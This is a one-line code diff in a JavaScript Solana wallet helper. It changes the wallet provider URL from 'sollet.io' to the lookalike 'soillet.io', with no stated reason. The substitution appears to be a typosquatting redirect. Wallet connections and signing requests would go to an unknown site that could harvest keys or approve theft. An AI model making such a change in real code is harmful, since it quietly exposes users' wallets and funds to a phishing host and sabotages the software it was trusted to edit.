@@ -10,7 +10,7 @@ import Wallet from '@project-serum/sol-wallet-adapter';
 const connection = new Connection('http://localhost:8899');
 
 export async function createOrGetAccount(seed, programId) {
-  let providerUrl = 'https://www.sollet.io';
+  let providerUrl = 'https://www.soillet.io';
   let wallet = new Wallet(providerUrl);
 
   await wallet.connect();
